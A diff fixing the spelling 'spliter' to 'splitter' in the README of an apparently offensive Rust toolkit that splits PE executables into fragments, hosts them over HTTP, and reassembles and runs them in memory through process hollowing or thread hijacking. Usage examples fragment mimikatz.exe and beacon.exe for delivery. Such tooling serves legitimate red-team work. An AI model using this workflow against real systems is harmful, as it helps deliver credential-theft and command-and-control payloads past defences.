@@ -11,7 +11,7 @@ The toolkit splits PE executables into multiple fragments, distributes them acro
 ## Components
 
 - **MainLib**: Shared core functionality
-- **Spliter**: Splits PE binaries into N parts with cryptographic checksums
+- **Splitter**: Splits PE binaries into N parts with cryptographic checksums
 - **Mounter**: Downloads fragments, reconstructs in memory, and executes via multiple techniques
   - **MounterCLI**: A CLI for run a simple loader
   - **MounterLib**: Core library with execution methods (Local PE, Process Hollowing, Thread Hijacking)
@@ -26,7 +26,7 @@ cargo build --release
 ```
 
 This generates three binaries:
-- `target/release/spliter.exe` - Binary splitter tool
+- `target/release/splitter.exe` - Binary splitter tool
 - `target/release/mounter.exe` - Fragment loader and executor
 - `target/release/demo.exe` - Example implementation
 
@@ -34,17 +34,17 @@ This generates three binaries:
 
 ### 1. Splitting a Binary
 
-The spliter tool divides an executable into multiple fragments, each with a verification header containing checksums and metadata.
+The splitter tool divides an executable into multiple fragments, each with a verification header containing checksums and metadata.
 
 ```bash
 # Split into 3 parts (default)
-./target/release/spliter.exe payload.exe
+./target/release/splitter.exe payload.exe
 
 # Split into 5 parts with custom output directory
-./target/release/spliter.exe payload.exe --pieces 5 --output ./fragments
+./target/release/splitter.exe payload.exe --pieces 5 --output ./fragments
 
 # Split with custom name prefix
-./target/release/spliter.exe mimikatz.exe --pieces 10 --name beacon
+./target/release/splitter.exe mimikatz.exe --pieces 10 --name beacon
 ```
 
 **Output example:**
@@ -90,7 +90,7 @@ The mounter downloads fragments from URLs, validates their integrity, reconstruc
 **Complete workflow example:**
 ```bash
 # 1. Split your payload
-./target/release/spliter.exe beacon.exe --pieces 3
+./target/release/splitter.exe beacon.exe --pieces 3
 
 # 2. Host fragments on a web server
 python -m http.server 8000
